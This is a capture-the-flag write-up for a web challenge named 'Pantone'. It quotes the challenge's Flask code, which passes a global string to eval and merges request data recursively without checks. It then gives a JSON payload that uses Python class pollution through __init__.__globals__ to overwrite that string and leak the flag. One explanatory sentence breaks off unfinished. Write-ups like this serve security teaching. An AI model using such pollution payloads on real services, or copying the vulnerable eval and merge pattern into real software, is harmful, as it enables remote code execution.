# Pantone

Color mixer with a twist. See what it is.

# Flag
```
GCTF25{COL0Rfu1_C!a55_polLU71ON}
```

# Solution

<img src="imgs/index.png">

Looking at the source code to see how this website works, I saw some interesting features.

```py
_EXEC_CMD = base64.b64decode(b'Q09MT1JTLmdldENvbG9ycygp').decode()
...
@app.route('/colors', methods=['POST'])
def colors():
    try:
        ...
        _0x1a2b(_req_data, COLORS)
        _result = eval(_EXEC_CMD)
        return _result

    ...
```

Why didn't the challenge author just parse the string which needed to be evaluated directly into the `evel()`function, instead of declaring a global variable `_EXEC_CMD` then parsing it? Maybe we can overwrite the value of this variable to conduct RCE.

```py
def _0x1a2b(_s, _d): 
    _get = getattr
    _set = setattr
    _has = hasattr
    _type = type
    _dict = dict
    for _k, _v in _s.items(): 
        if _has(_d, '__getitem__'): 
            _tmp = _d.get(_k) if hasattr(_d, 'get') else None
            if _tmp and _type(_v) == _dict: 
                _0x1a2b(_v, _tmp) 
            else: 
                _d[_k] = _v 
        elif _has(_d, _k) and _type(_v) == _dict: 
                _0x1a2b(_v, _get(_d, _k)) 
        else: 
            _set(_d, _k, _v)

```

This is a merger function which 

Payload:

```json
{
    "color1":"red",
    "color2":"yellow",
    "color3":"blue",
    "__init__":{
        "__globals__": {
            "_EXEC_CMD": "jsonify({'message':flag,'rgb':[128,128,128]})"
        }
    }
}
```